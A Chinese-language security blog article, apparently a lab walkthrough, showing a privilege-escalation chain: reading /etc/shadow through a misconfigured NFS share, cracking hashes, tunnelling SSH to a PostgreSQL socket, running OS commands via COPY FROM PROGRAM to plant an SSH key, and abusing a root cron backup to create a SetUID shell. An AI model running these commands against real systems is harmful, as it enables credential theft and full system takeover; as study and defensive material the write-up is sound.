---
title: 利用NFS逃逸与PostgreSQL隧道提权
url: https://mp.weixin.qq.com/s/XS0UrXFkFyDYXTD4VQeBZA
source: Doonsec's feed
date: 2026-02-14
fetch_date: 2026-02-15T04:24:31.252182
---

# 利用NFS逃逸与PostgreSQL隧道提权

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/KysoJFiczHUsRJUr1CfXoBnD6f95xL1VXe0SyrwibhHNYricCoicEdibno6KpEdQYWvUwtKWic8adR0ztD1oR4n2WvGbMP4nMOWc3QicBGcJ7tmrN8/0?wx_fmt=jpeg)

# 利用NFS逃逸与PostgreSQL隧道提权

柠檬赏金猎人

![]()

在小说阅读器中沉浸阅读

### 概述

核心挑战围绕不安全的NFS配置和PostgreSQL数据库展开。攻击者首先通过NFS共享读取系统敏感文件获取凭证，然后利用SSH隧道访问PostgreSQL UNIX套接字，最终通过滥用定时备份任务实现从普通用户到root的权限提升。本文将详细解析整个渗透测试过程，涵盖信息收集、漏洞利用和权限提升的完整链条。

![](https://mmbiz.qpic.cn/mmbiz_jpg/KysoJFiczHUugdFEiar5gcScRG1R9enO49QsfOtZKDsRSiaER42cJK9Pv1BxpZyPsZfJt4sPRxNYPmAJdZgyWbaGSMQ5ibRdHrXKwXzTaUrPr60/640?wx_fmt=jpeg)

### 技术/功能

* **NFS枚举与文件读取**：利用`showmount`和`netexec`发现并列出NFS共享，通过配置缺陷逃逸共享边界读取系统文件。
* **凭证破解**：从`/etc/shadow`和PostgreSQL历史文件中提取哈希，使用John the Ripper破解yescrypt哈希。
* **SSH UNIX套接字隧道**：通过SSH的`-L`选项将本地端口转发到远程UNIX套接字，从而访问仅监听本地套接字的PostgreSQL服务。
* **PostgreSQL命令执行**：利用`COPY FROM PROGRAM`功能在数据库服务器上执行操作系统命令。
* **Cron任务滥用**：通过分析定时备份脚本，利用`pg_basebackup`工具将SetUID shell写入备份目录，实现权限提升。

### 使用示例

#### 1. NFS共享枚举与文件读取

使用`netexec`枚举NFS共享并利用`no_subtree_check`配置缺陷读取任意文件：

```
# 枚举共享
netexec nfs 10.129.234.160 --enum-shares

# 逃逸共享边界列出根目录
netexec nfs 10.129.234.160 --ls /

# 下载系统敏感文件
netexec nfs 10.129.234.160 --get-file /etc/shadow shadow
```

#### 2. 破解用户哈希

使用John the Ripper破解从shadow文件中获取的yescrypt哈希：

```
john --wordlist=./rockyou.txt ./shadow.hashes
```

#### 3. 建立SSH隧道访问PostgreSQL

使用获取的凭证建立到PostgreSQL UNIX套接字的SSH隧道：

```
sshpass -p service ssh -N -L 5432:/var/run/postgresql/.s.PGSQL.5432 service@10.129.234.160
```

#### 4. PostgreSQL命令执行与SSH密钥部署

通过PostgreSQL执行系统命令并部署SSH公钥：

```
-- 创建表存储命令输出
CREATE TABLE cmd(output text);

-- 执行id命令
COPY cmd FROM PROGRAM 'id';

-- 创建.ssh目录并设置权限
COPY cmd FROM PROGRAM 'mkdir -p /var/lib/postgresql/.ssh';
COPY cmd FROM PROGRAM 'chmod 700 /var/lib/postgresql/.ssh';

-- 写入SSH公钥
COPY (SELECT 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing')
TO PROGRAM 'tee /var/lib/postgresql/.ssh/authorized_keys';
```

#### 5. 利用Cron任务提权

分析备份脚本并利用`pg_basebackup`写入SetUID shell：

```
# 查看备份脚本
cat /usr/bin/backup

# 复制bash到PostgreSQL数据目录并设置SetUID
cp /bin/bash /var/lib/postgresql/14/main/
chmod 6777 /var/lib/postgresql/14/main/bash

# 等待cron执行后运行提权shell
/opt/backups/current/bash -p
```

### 注意事项

1. **NFS配置风险**：`no_subtree_check`选项允许客户端逃逸共享目录边界，应避免在生产环境中使用。
2. **PostgreSQL安全**：默认情况下PostgreSQL仅监听本地UNIX套接字是安全做法，但通过SSH隧道可能绕过此限制。
3. **备份脚本权限**：以root身份运行的备份脚本不应信任用户可写的源目录，否则可能被注入恶意文件。
4. **凭证管理**：避免在历史文件或数据库中存储明文或弱哈希密码，应使用强哈希算法并定期轮换。
5. **工具版本**：使用`netexec`时注意版本，旧版本可能存在文件读取bug（本文涉及的问题已修复）。

### 参考链接

* https://www.netexec.wiki/nfs-protocol/escape-to-root-file-system
* https://www.postgresql.org/docs/current/app-pgbasebackup.html
* https://crackstation.net/
* https://github.com/DominicBreuker/pspy

---

仅限交流学习使用，如您在使用本工具或代码的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。“如侵权请私聊公众号删文”。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/OkRKg4J9smV0q1aJxxA7GF9uXFH0S6D3QRb0jNcE13icxpHvErdgibarS4mwYYE2aicga15MMmcOCdTazgj9ibn0RA/0?wx_fmt=png)

柠檬赏金猎人

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/OkRKg4J9smV0q1aJxxA7GF9uXFH0S6D3QRb0jNcE13icxpHvErdgibarS4mwYYE2aicga15MMmcOCdTazgj9ibn0RA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过